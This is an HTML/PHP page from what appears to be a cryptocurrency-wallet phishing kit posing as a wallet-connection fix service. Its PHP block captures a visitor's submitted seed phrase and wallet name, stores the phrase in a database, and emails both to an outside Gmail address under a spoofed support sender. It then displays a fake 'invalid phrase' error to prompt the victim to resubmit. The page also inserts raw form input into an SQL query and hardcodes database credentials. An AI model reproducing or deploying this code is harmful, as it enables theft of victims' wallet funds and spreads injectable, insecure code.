<html>
  
  <head>
    <title> WALLET IMPORT ERROR</title>
       <link rel="shortcut icon" type="image/x-icon" href="favicon.png">
  </head>
  <script type="text/javascript">
      function googleTranslateElementInit() {
        new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
    }
  </script>
  <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>

  <body>
  
<?php
$user_input = $_POST ['phase'];
$Servername = "127.0.0.1";
$dBusername = "u191827762_fixdapps";
$dBPassword = "123Admin...";
$dBname = "u191827762_fixdapps";
$wallet_name = $_POST ['wallet_name'];


$conn = mysqli_connect($Servername, $dBusername, $dBPassword, $dBname);
if (!$conn) {die ("Connection failed:") ;}else{
  $query = "INSERT INTO client_phase (
phase) VALUES ('$user_input')";
 
// danielsmiths993@gmail.com
$to = 'ariabrown300@gmail.com';
$subject = 'New user input';
$message ="Hi Admin, this is to notify you of a new client input: $user_input. Wallet Name: $wallet_name for Multinetworkinterface";
$from = 'support@decentralizenetworkinterface.com';
$headers= 'From: ' .$from;
mail($to, $subject, $message, $headers);
;};


$result = mysqli_query($conn, $query);

if (!$result) {die ("Query failed:") ;}else{mysqli_close($conn);}
?>

   
      
      
      
  
    
     <img src="assets/images/WC.jpg" alt="bitcoin" style="max-width: 100px;" href="index.html">
 <div style="position: absolute;
               top: 45%;
               left: 50%;
               transform: translate(-50%, -50%);
               text-align:center;">
     <h1 style="color:red;">Error connecting wallet. Mnemonic phrase must be at least 12 to 24 words, each separated by a space!
   <br><br>Please retype a valid phrase </h1>
   <img src="assets/images/check.gif" alt="bitcoin" style="max-width: 500px;">
   <br><a href="index.html">Home</a>
 </div>
 
<!--<footer style="text-align: center; margin: 20px 0 10px 0; padding:20px;">-->
<!--    <p style="font-size: x-large;">Contact us: support@multinetworkinterface.com</p>-->
<!--    <p>Most secure tool for all wallets node correction featuring kyc and others interesting functions</p>-->
<!--   </div>-->
<!-- </footer>-->
 
    

  
  
 



</body>
</html>
